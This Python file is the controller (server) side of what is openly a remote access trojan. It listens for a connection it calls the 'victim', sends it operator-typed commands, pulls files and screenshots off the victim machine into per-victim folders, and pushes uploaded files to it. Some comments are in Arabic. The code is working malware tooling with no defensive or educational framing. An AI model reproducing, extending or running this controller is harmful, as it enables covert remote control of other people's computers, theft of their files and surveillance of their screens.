import socket
import os
import struct
import tqdm
import time

def send_msg(sock, msg):
    msg = struct.pack('>I', len(msg)) + msg
    sock.sendall(msg)

def recv_msg(sock):
    raw_msglen = recv_all(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    return recv_all(sock, msglen)

def recv_all(sock, n):
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data

ip = "127.0.0.1"
port = 7850

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((ip, port))
server.listen()

print("Server ready for connections...")

victim_socket, victim_addr = server.accept()
print(f"Connection from: {victim_addr}")

while True:
    command = input("Enter command: ")
    send_msg(victim_socket, command.encode())
    
    if command.lower() == 'exit':
        break
        
    response_type = recv_msg(victim_socket)
    
    if not response_type:
        print("Connection lost")
        break
        
    if response_type == b'FILE':
        file_name = command[9:]
        folder = f"Victim_{victim_addr[0]}_{victim_addr[1]}"
        os.makedirs(folder, exist_ok=True)
        save_path = os.path.join(folder, os.path.basename(file_name))
        
        file_size = int(recv_msg(victim_socket).decode())
        
        progress = tqdm.tqdm(total=file_size, unit='B', colour="red", unit_divisor=1024, unit_scale=True, desc=f"Downloading {file_name}")
        
        with open(save_path, 'wb') as f:
            remaining = file_size
            while remaining > 0:
                data = recv_msg(victim_socket)
                if not data:
                    break
                f.write(data)
                remaining -= len(data)
                progress.update(len(data))
        
        progress.close()
        print(f"\nFile saved to: {save_path}")

    elif response_type == b'SCREENSHOT':
        try:
            # Read the size (4 bytes)
            size_data = recv_all(victim_socket, 4)
            if not size_data:
                print("Error: Failed to receive screenshot size")
                continue
                
            screenshot_size = struct.unpack('>I', size_data)[0]
            
            # Receive the actual image data
            screenshot_data = recv_all(victim_socket, screenshot_size)
            if not screenshot_data or len(screenshot_data) != screenshot_size:
                print(f"Error: Incomplete screenshot data received ({len(screenshot_data) if screenshot_data else 0}/{screenshot_size} bytes)")
                continue
                
            # Save the file
            folder = f"Victim_{victim_addr[0]}_{victim_addr[1]}"
            os.makedirs(folder, exist_ok=True)
            screenshot_path = os.path.join(folder, f"screenshot_{int(time.time())}.png")
            
            with open(screenshot_path, 'wb') as f:
                f.write(screenshot_data)
            
            print(f"Screenshot saved successfully to: {screenshot_path}")
            print(f"File size: {os.path.getsize(screenshot_path)} bytes")
            
        except Exception as e:
            print(f"Screenshot error: {str(e)}")

    
    elif command.startswith("upload "):
        try:
            file_path = command[7:]
            if os.path.exists(file_path):
                # إرسال أمر خاص بالرفع
                send_msg(victim_socket, b'UPLOAD_START')
                
                # إرسال اسم الملف
                send_msg(victim_socket, os.path.basename(file_path).encode())
                
                # إرسال حجم الملف
                file_size = os.path.getsize(file_path)
                send_msg(victim_socket, str(file_size).encode())
                
                # إرسال محتوى الملف
                progress = tqdm.tqdm(total=file_size, unit='B', unit_scale=True ,colour="green", desc=f"Uploading {file_path}")
                
                with open(file_path, 'rb') as f:
                    while True:
                        data = f.read(4096)
                        if not data:
                            break
                        send_msg(victim_socket, data)
                        progress.update(len(data))
                
                progress.close()
                print(f"\nFile uploaded successfully")
            else:
                print("Error: File not found on server")
        except Exception as e:
            print(f"Upload error: {str(e)}")


    else:
        print(response_type.decode())

victim_socket.close()